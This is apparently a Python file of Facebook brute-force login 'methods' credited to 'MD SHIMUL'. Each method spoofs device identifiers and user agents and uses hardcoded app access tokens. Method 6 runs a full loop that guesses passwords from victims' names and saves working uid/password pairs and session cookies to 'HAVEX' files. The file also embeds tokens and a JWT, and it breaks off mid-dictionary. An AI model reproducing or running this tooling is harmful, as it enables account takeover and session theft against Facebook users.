#SCRIPT WRITTEN BY ëë MD SHIMULëë
#GITHUB : MRSH4MUL
#FACEBOOK:MD SHIMUL
#YOUTUBE : NAI
#WHATSAPP:+8801830733258


accessToken = [
'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
'6628568379|c1e620fa708a1d5696fb991c1bde5662', ok
'1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae'
]

#_____________________method 1_____________________#
data = {
'adid':adid,
'email':ids,
'password':pas,
'cpl':'true',
'credentials_type':'device_based_login_password',
"source": "device_based_login",
'error_detail_type':'button_with_disabled',
'source':'login','format':'json',
'generate_session_cookies':'1',
'generate_analytics_claim':'1',
'generate_machine_id':'1',
"locale":"es_CU","client_country_code":"CU",
'device':gtt,
'device_id':adid,
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
head = {
'content-type':'application/x-www-form-urlencoded',
'x-fb-sim-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-type':'unknown',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'user-agent':ua_string,
'x-fb-net-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
'x-fb-connection-quality':'EXCELLENT',
'x-fb-friendly-name':'authenticate',
'accept-encoding':'gzip, deflate',
'x-fb-http-engine':'Liger'}
url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
#_____________________method 2_____________________#
#SCRIPT WRITTEN BY ëë MD SHIMULëë
#GITHUB : MRSH4MUL
#FACEBOOK : MD SHIMUL
#YOUTUBE : NAI
#WHATSAPP:+8801830733258

#file
data = {
"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
headers = {
'User-Agent': randBuildLSB(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
#_____________________method 3_____________________#
#SCRIPT WRITTEN BY ëë MD SHIMULëë
#GITHUB:MRSH4MUL
#FACEBOOK : MD SHIMUL
#YOUTUBE : NAI
#WHATSAPP:+8801830733258

#random
ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/160.82.0.4;FBBV/19565504;FBDM/{density=1.5,width=1397,height=1943};FBLC/en_US;FBRV/11719295;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/5.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
data = {
"adid": str(uuid.uuid4()).upper(),
"format": "json",
"device_id" : str(uuid.uuid4()).upper(),
"family_device_id": str(uuid.uuid4()).upper(),
"secure_family_device_id": str(uuid.uuid4()).upper(),
"email": ids,
"password": pas,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
"error_detail_type": "button_with_disabled",
"credentials_type": "device_based_login_password",
"generate_session_cookies": "1",
"source": "device_based_login",
"advertiser_id": str(uuid.uuid4()).upper(),
"meta_inf_fbmeta": "",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
"api_key": "882a8490361da98702bf97a021ddc14d",
}
head = {
'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'Priority': 'u=3, i',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Session-Id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-Fb-Connection-Bandwidth': '24807555',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-Connection-Quality':"EXCELLENT",
'X-Tigon-Is-Retry': 'False',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'unknown',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'Content-Length': '847',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
}
po = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, allow_redirects=False).json()
#_____________________method 4_____________________#
#SCRIPT WRITTEN BY ëëëMD SHIMULë
#GITHUB : MRSH4MUL
#FACEBOOK : MD SHIMUL
#YOUTUBE : NAI
#WHATSAPP:+8801830733258

#random
accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/181.92.85.27;FBBV/59224467;FBDM/{density=3.5,width=1071,height=1319};FBLC/en_US;FBRV/94908280;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
head = {
'User-Agent':ua,
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True',
'x-fb-connection-token':'d29d67d37eca387482a8a5b740f84f62'}
data = {
'adid':str(uuid.uuid4()),
'format':'json',
'device_id':str(uuid.uuid4()).upper(),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'family_device_id':str(uuid.uuid4()).upper(),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'en_US',
'client_country_code':'US',
'fb_api_req_friendly_name':'authenticate',
'api_key':'882a8490361da98702bf97a021ddc14d',
'access_token':access_token}
po = requests.post('https://b-api.facebook.com/auth/login', data=data, headers=head).json()
#_____________________method 5_____________________#
#SCRIPT WRITTEN BY ëëMD SHIMUL"
#GITHUB :MRSH4MUL
#FACEBOOK : MD SHIMUL
#YOUTUBE : NAI
#WHATSAPP:+8801830733258

#file
tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|216a8ca8adfa721bd1e84171d5abad204b082890','6628568379|c1e620fa708a1d5696fb991c1bde5662']
accees_token = random.choice(tokenlist)
random_seed = random.Random()
fbcr = sim_id
ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555))+";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/179.38.63.35;FBBV/22023207;FBDM/{density=2.4,width=947,height=1806};FBLC/en_US;FBRV/36921410;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/8.9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
head = {
'User-Agent':ua,
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization': str(random.choice(tokenlist)),
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'X-FB-Connection-Quality':'EXCELLENT',
'X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True'}
data = {
'adid':str(''.join(random_seed.choices(string.hexdigits, k=16))).upper(),
'format':'json','device_id':str(uuid.uuid4()).upper(),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'cpl':'true','try_num':'1',
'device_id':str(uuid.uuid4()).upper(),
'credentials_type':'device_based_login_password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':"en_US",
"client_country_code":"US",
"method":"auth.login",
"fb_api_req_friendly_name":"authenticate",
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
po = requests.post('https://b-api.facebook.com/method/auth.login', data=data, headers=head).json()
#_____________________method 6_____________________#
#file
def api2(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m[HAVEX-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
			with requests.Session() as session:
				fbcr = sim_id
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/150.48.82.94;FBBV/70184321;FBDM/{density=3.9,width=854,height=1988};FBLC/en_US;FBRV/29986674;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
			data = {
			"adid": str(uuid.uuid4()).upper(),
			"format": "json",
			"device_id" : str(uuid.uuid4()).upper(),
			"family_device_id": str(uuid.uuid4()).upper(),
			"secure_family_device_id": str(uuid.uuid4()).upper(),
			"email": ids,
			"password": pas,
			"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
			'sim_serials': "['80973453345210784798']",
			'openid_flow': 'android_login',
			'openid_provider': 'google',
			'openid_emails': "['01710940017']",
			'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
			"error_detail_type": "button_with_disabled",
			"credentials_type": "device_based_login_password",
			"generate_session_cookies": "1",
			"source": "device_based_login",
			"advertiser_id": str(uuid.uuid4()).upper(),
			"meta_inf_fbmeta": "",
			"currently_logged_in_userid": "0",
			"locale": "en_US",
			"client_country_code": "US",
			"method": "auth.login",
			"fb_api_req_friendly_name": "authenticate",
			'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
			"api_key": "882a8490361da98702bf97a021ddc14d",
			}
			head = {
			'User-Agent': ua,
			'Content-Type': 'application/x-www-form-urlencoded',
			'Host': 'graph.facebook.com',
			'Priority': 'u=3, i',
			'X-FB-Net-HNI': str(random.randint(20000, 40000)),
			'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
			'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
			'X-FB-Session-Id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
			'X-Fb-Connection-Bandwidth': '24807555',
			'X-FB-Connection-Type': 'MOBILE.LTE',
			'X-FB-Connection-Quality':"EXCELLENT",
			'X-Tigon-Is-Retry': 'False',
			'x-fb-device-group': '5120',
			'X-FB-Friendly-Name': 'ViewerReactionsMutation',
			'X-FB-Request-Analytics-Tags': 'unknown',
			'X-FB-HTTP-Engine': 'Liger',
			'X-FB-Client-IP': 'True',
			'X-FB-Server-Cluster': 'True',
			'Content-Length': '847',
			'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
			}
			po = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, allow_redirects=False).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={ssbb};{ckkk}"
					print('\r\r\033[1;32m [HAVEX-OK] '+uid+' ‚úì '+pas)
					print(' \33[1;33m[Biscut üç™] ‚úì '+cookie)
					open('/sdcard/HAVEX/HAVEX-FILE-OK.txt','a').write(uid+'|'+pas+'\n')
					open('/sdcard/HAVEX/HAVEX-FILE-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
					oks.append(uid)
					break
			elif 'www.facebook.com' in po['error']['message']:
					uid = str(po['error']['error_data']['uid'])
					#print('\r\033[1;91m [HAVEX-CP] '+uid+' √ó '+pas+'\033[1;97m')
					open('/sdcard/HAVEX/HAVEX-CP.txt','a').write(uid+'|'+pas+'\n')
					cps.append(uid)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass

#_____________________method 7_____________________#
import json
import requests
import uuid
import random

# Generate UUIDs for the required fields
adid = str(uuid.uuid4())
device_id = str(uuid.uuid4())
family_device_id = str(uuid.uuid4())

# Login credentials
uid = "DANISH"
ps = "19982018"

# User agent string
user_agent = "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1"

# Headers for the request
headers = {
    'User-Agent': user_agent,
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
    'X-FB-Connection-Type': 'WIFI',
    'X-Tigon-Is-Retry': 'False',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
    'x-fb-device-group': '5120',
    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
}

# Data for the POST request
data = {
    'adid': adid,
    'format': 'json',
    'device_id': device_id,
    'email': uid,
    'password': ps,
    'generate_analytics_claims': '1',
    'community_id': '',
    'cpl': 'true',
    'try_num': '1',
    'family_device_id': family_device_id,
    'credentials_type': 'password',
    'source': 'login',
    'error_detail_type': 'button_with_disabled',
    'enroll_misauth': 'false',
    'generate_session_cookies': '1',
    'generate_machine_id': '1',
    'currently_logged_in_userid': '0',
    'locale': 'en_US',
    'client_country_code': 'US',
    'fb_api_req_friendly_name': 'authenticate',
    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
}

# URL for the login request
url = 'https://b-graph.facebook.com/auth/login'

# Send the POST request
response = requests.post(url, data=data, headers=headers, allow_redirects=False)
response_data = response.text

# Parse the JSON response
parsed_response = json.loads(response_data)
print(parsed_response)
#_____________________method 8_____________________#
data={
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': ps,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true','try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate'}
head={
'User-Agent': kk,
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}  
po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
#_____________________method 9_____________________#rd
accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
head = {
'User-Agent':VENOM_UA(),
'Accept-Encoding':'gzip, deflate',
'Connection':'close',
'Content-Type':'application/x-www-form-urlencoded',
'Host':'graph.facebook.com',
'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type':'WIFI',
'X-Tigon-Is-Retry':'False',
'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group':'5120',
'X-FB-Friendly-Name':'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags':'graphservice',
'X-FB-HTTP-Engine':'Liger',
'X-FB-Client-IP':'True',
'X-FB-Server-Cluster':'True',
'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
data = {
'adid':str(uuid.uuid4()),
'format':'json',
'device_id':str(uuid.uuid4()),
'email':ids,
'password':pas,
'generate_analytics_claims':'1',
'community_id':'',
'cpl':'true',
'try_num':'1',
'family_device_id':str(uuid.uuid4()),
'credentials_type':'password',
'source':'login',
'error_detail_type':'button_with_disabled',
'enroll_misauth':'false',
'generate_session_cookies':'1',
'generate_machine_id':'1',
'currently_logged_in_userid':'0',
'locale':'es_ES',
'client_country_code':'ES',
'fb_api_req_friendly_name':'authenticate',
'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
'access_token':accees_token}
po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
#_____________________method 10_____________________#rnd ok
data={
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': ps,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate'}
head={
f'User-Agent': kk,
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}  
po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
#_____________________method 11_____________________#rnd ok
data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
q = json.load(data)
#_____________________method 12_____________________#rnd ok
#======================SH4MUL Tool Method ======================#
#file
device_family_id = str(uuid.uuid4())
adid = str(uuid.uuid4())
machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
data = {'adid':adid,
'format':'json',
'device_id':device_family_id,
'email':ids,
'password':pas,
'generate_analytics_claim':'1',
'community_id':'','cpl':'true','try_num':'1',
'family_device_id':device_family_id,
'credentials_type':'device_based_login_password',
'generate_session_cookies':'1',
'error_detail_type':'button_with_disabled',
'source':'device_based_login',
'machine_id':machine_id,
'login_location_accuracy_m':'1.0',
'meta_inf_fbmeta':'',
'advertiser_id':adid,
'encrypted_msisdn':'',
'currently_logged_in_userid':'0',
'locale':'en_PK',
'client_country_code':'PK',
'method':'auth.login',
'fb_api_req_friendly_name':'authenticate',
'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
head = {
'content-type':'application/x-www-form-urlencoded',
'x-fb-sim-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-type':'unknown',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'user-agent':ua_string,
'x-fb-net-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
'x-fb-connection-quality':'EXCELLENT',
'x-fb-friendly-name':'authenticate',
'accept-encoding':'gzip, deflate',
'x-fb-http-engine':'Liger'}
url = 'https://b-api.facebook.com/method/auth.login'
po = requests.post(url,data=data,headers=head,allow_redirects=False).text
q = json.loads(po)
#_____________________method 13_____________________#rnd ok
#SCRIPT WRITTEN BYëëMD SHIMUL
#GITHUB : MRSH4MUL
#FACEBOOK : MD SHIMUL
#YOUTUBE :NAI
#WHATSAPP:+8801830733258

#==================== SH4MUL Tool Method ======================#
#file
data={
"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email":ids,
"password":pas,
"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies":"1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
headers = {
"Content-Type": "application/x-www-form-urlencoded",
"Host": "graph.facebook.com",
"User-Agent": ua,
"X-FB-Net-HNI": "45204",
"X-FB-SIM-HNI": "45201",
"X-FB-Connection-Type": "MOBILE.LTE",
"X-Tigon-Is-Retry": "False",
"x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
"x-fb-device-group": "5120",
"X-FB-Friendly-Name": "ViewerReactionsMutation",
"X-FB-Request-Analytics-Tags": "graphservice",
"Accept-Encoding": "gzip, deflate",
"X-FB-HTTP-Engine": "Liger",
"X-FB-Client-IP": "True",
"X-FB-Server-Cluster": "True",
"x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
"Connection": "Keep-Alive"}
url = 'https://b-graph.facebook.com/auth/login'
twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
po = requests.post(url,data=data,headers=headers).json()
#_____________________method 14_____________________#rnd ok
#======================SH4MULTool Method ======================#
#file
data = {
"adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
